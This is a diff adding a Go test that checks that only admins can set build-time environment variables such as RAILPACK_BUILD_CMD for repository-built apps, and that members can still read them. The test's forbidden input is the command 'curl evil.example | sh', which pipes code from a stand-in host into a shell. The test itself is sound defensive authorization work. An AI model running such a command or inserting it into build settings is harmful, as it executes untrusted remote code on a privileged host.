@@ -146,3 +146,56 @@ func TestARailpackAppHasNoDockerfile(t *testing.T) {
 		t.Errorf("created %+v", created)
 	}
 }
+
+// An app's environment is the container's, and for an app that builds it
+// is also the build's: Railpack reads it to work out how to build the
+// repository, and turns RAILPACK_INSTALL_CMD, RAILPACK_BUILD_CMD and
+// RAILPACK_START_CMD into commands the build runs — inside the
+// privileged builder, on this host.
+//
+// The app's own variables win the merge over its environment's and its
+// project's, so a member who could write them could decide what an
+// admin's app builds and runs, and a push to the branch would run it
+// with nobody asked. Writing them therefore takes the role the source
+// takes to deploy.
+func TestOnlyAnAdminMayWriteABuildingAppsEnv(t *testing.T) {
+	f := servertest.New(t)
+	_, memberKey := f.AddMember(t, "member", user.RoleMember)
+
+	// An admin's app that builds from a repository.
+	var built struct {
+		Reference string `json:"reference"`
+	}
+	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps",
+		railpackApp("detected"), f.AdminKey, &built), http.StatusCreated)
+
+	for _, c := range []struct {
+		method string
+		body   map[string]any
+	}{
+		{http.MethodPatch, map[string]any{"set": map[string]string{"RAILPACK_BUILD_CMD": "curl evil.example | sh"}}},
+		{http.MethodPut, map[string]any{"vars": map[string]string{"RAILPACK_BUILD_CMD": "curl evil.example | sh"}}},
+	} {
+		servertest.RequireStatus(t, f.Do(t, c.method,
+			"/apps/"+built.Reference+"/env", c.body, memberKey), http.StatusForbidden)
+	}
+
+	// The same member writes the environment of an app that only runs a
+	// published image, which is what the member role is for.
+	var published struct {
+		Reference string `json:"reference"`
+	}
+	servertest.RequireStatus(t, f.DoJSON(t, http.MethodPost, "/apps", map[string]string{
+		"name": "published", "project": "web",
+		"source": "external", "image": "nginx",
+	}, memberKey, &published), http.StatusCreated)
+
+	servertest.RequireStatus(t, f.Do(t, http.MethodPatch,
+		"/apps/"+published.Reference+"/env",
+		map[string]any{"set": map[string]string{"PORT": "8080"}}, memberKey), http.StatusOK)
+
+	// Reading stays a member's: seeing how an app is configured is not
+	// deciding what it builds.
+	servertest.RequireStatus(t, f.Do(t, http.MethodGet,
+		"/apps/"+built.Reference+"/env", nil, memberKey), http.StatusOK)
+}
